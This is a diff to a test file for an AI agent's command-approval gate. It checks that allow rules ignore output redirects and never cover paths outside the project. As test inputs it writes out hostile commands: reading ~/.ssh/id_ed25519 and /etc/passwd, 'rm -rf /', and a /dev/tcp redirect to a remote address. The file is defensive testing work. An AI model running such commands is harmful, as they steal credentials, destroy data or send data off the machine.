@@ -5,6 +5,8 @@ import {
   defaultRuleInputs,
   describeRule,
   evaluateRules,
+  explainRules,
+  withoutOutputRedirects,
   parseRuleInput,
   shellSegments,
   suggestRuleFor,
@@ -341,5 +343,122 @@ describe('CLAIM-RULES-SEE-REDIRECTS: a redirect target is judged as a path', () 
 
   it('a device other than the standard streams is still a path outside the project', () => {
     expect(decide('cat x >/dev/tcp/1.2.3.4/80')).toBe('held');
+  });
+});
+
+/**
+ * CLAIM-ALLOW-RULES-CONFINED. An allow rule, prefix or regex, matches the
+ * command itself, not how its output is plumbed, and never covers a path
+ * outside the project.
+ *
+ * Measured on 2026-11-03 in a `solix gate` run: the policy rule
+ * `^npm (pack|publish) --dry-run$` refused `npm publish --dry-run 2>&1` because
+ * the agent added `2>&1`. And a regex allow skipped the outside-the-project
+ * check that prefix rules apply, so `^cat ` covered `cat ~/.ssh/id_ed25519`.
+ */
+describe('CLAIM-ALLOW-RULES-CONFINED: allow rules match the command and stay in the project', () => {
+  const regex = (value: string, decision: 'allow' | 'deny' = 'allow') =>
+    rule({ tool: 'Bash', match: 'command_regex', value, decision });
+  const decide = (rules: ApprovalRule[], c: string) => evaluateRules(rules, cmd(c))?.decision ?? 'held';
+
+  it('strips only output-only redirects', () => {
+    expect(withoutOutputRedirects('npm publish --dry-run 2>&1')).toBe('npm publish --dry-run');
+    expect(withoutOutputRedirects('npm test >/dev/null 2>&1')).toBe('npm test');
+    expect(withoutOutputRedirects('npm test &> /dev/null')).toBe('npm test');
+    expect(withoutOutputRedirects('echo hi >&2')).toBe('echo hi');
+    expect(withoutOutputRedirects('echo hi > out.txt')).toBe('echo hi > out.txt');
+    expect(withoutOutputRedirects('echo hi >/etc/x')).toBe('echo hi >/etc/x');
+  });
+
+  it.each(['npm publish --dry-run', 'npm publish --dry-run 2>&1', 'npm publish --dry-run >/dev/null 2>&1', 'npm publish --dry-run 2> /dev/null'])(
+    'an anchored regex covers %j',
+    (c) => {
+      expect(decide([regex('^npm (pack|publish) --dry-run$')], c)).toBe('allow');
+    },
+  );
+
+  it.each([
+    'npm publish',
+    'npm publish --dry-run --dry-run=false',
+    'npm publish --dry-run 2>&1 && npm publish',
+    'npm publish --dry-run > out.log',
+  ])('the same regex does not cover %j', (c) => {
+    expect(decide([regex('^npm (pack|publish) --dry-run$')], c)).toBe('held');
+  });
+
+  it.each(['cat ~/.ssh/id_ed25519', 'cat /etc/hostname', 'echo x >/etc/y', 'cat </etc/passwd'])(
+    'a regex allow does not cover %j, which names a path outside the project',
+    (c) => {
+      expect(decide([regex('^(cat|echo) ')], c)).toBe('held');
+    },
+  );
+
+  it('a regex allow still covers paths inside the project', () => {
+    expect(decide([regex('^cat ')], `cat ${ROOT}/README.md`)).toBe('allow');
+    expect(decide([regex('^cat ')], 'cat src/a.ts')).toBe('allow');
+  });
+
+  it('a regex deny still refuses whatever it matches, inside or out', () => {
+    expect(decide([prefix('cat'), regex('ssh', 'deny')], 'cat ~/.ssh/id_ed25519')).toBe('deny');
+    expect(decide([prefix('npm'), regex('^npm publish$', 'deny')], 'npm publish 2>&1')).toBe('deny');
+  });
+});
+
+/**
+ * CLAIM-RULES-TEST-IS-THE-GATE. `solix rules test` prints `explainRules`,
+ * whose verdict is `evaluateRules` itself, the function the router decides
+ * with. It names the uncovered segment, and a rule that matched but was kept
+ * out by a path outside the project.
+ */
+describe('CLAIM-RULES-TEST-IS-THE-GATE: explainRules agrees with the gate and names the gap', () => {
+  const defaults = defaultRuleInputs().map((r) => rule(r));
+  const cases = [
+    'cd packages/cli && ls -la && cat package.json | head -60',
+    'npm view @shmulikdav/solix version 2>&1; git status --short',
+    'cat /etc/hostname',
+    'echo hi >/etc/x',
+    'git push --force',
+    'rm -rf /',
+    'S=x; ls',
+  ];
+
+  const withDeny = [...defaults, prefix('git push', 'deny')];
+  const subjects = [
+    ...cases.map(cmd),
+    { tool: 'Read', args: { file_path: 'SPEC.md' }, root: ROOT },
+    { tool: 'Grep', args: { pattern: 'x' }, root: ROOT },
+    { tool: 'Write', args: { file_path: 'src/a.ts' }, root: ROOT },
+    { tool: 'Edit', args: { file_path: '/etc/hosts' }, root: ROOT },
+  ];
+
+  it.each(subjects)('its verdict for %j is exactly the gate\'s', (subject) => {
+    for (const rules of [defaults, withDeny, []]) {
+      expect(explainRules(rules, subject).verdict).toEqual(evaluateRules(rules, subject));
+    }
+  });
+
+  it('names the segment no rule covers', () => {
+    const e = explainRules(defaults, cmd('npm view x version 2>&1; git status --short'));
+    expect(e.verdict).toBeNull();
+    expect(e.segments.filter((s) => !s.coveredBy).map((s) => s.segment)).toEqual(['npm view x version 2>&1']);
+  });
+
+  it('says when a rule matched but a path outside the project kept it out', () => {
+    const e = explainRules(defaults, cmd('cat /etc/hostname'));
+    expect(e.segments[0]!.outside).toEqual(['/etc/hostname']);
+    expect(e.segments[0]!.matchedButOutside.map((r) => r.value)).toEqual(['cat']);
+  });
+
+  it('reports the denylist, which runs before any rule', () => {
+    expect(explainRules(defaults, cmd('rm -rf /')).denylisted).toMatch(/recursive force-delete/);
+    expect(explainRules(defaults, cmd('ls')).denylisted).toBeNull();
+  });
+
+  it('explains a file tool by its verdict alone', () => {
+    const inside = explainRules(defaults, { tool: 'Write', args: { file_path: 'src/a.ts' }, root: ROOT });
+    expect(inside.verdict?.decision).toBe('allow');
+    expect(inside.segments).toEqual([]);
+    const outside = explainRules(defaults, { tool: 'Write', args: { file_path: '/etc/x' }, root: ROOT });
+    expect(outside.verdict).toBeNull();
   });
 });
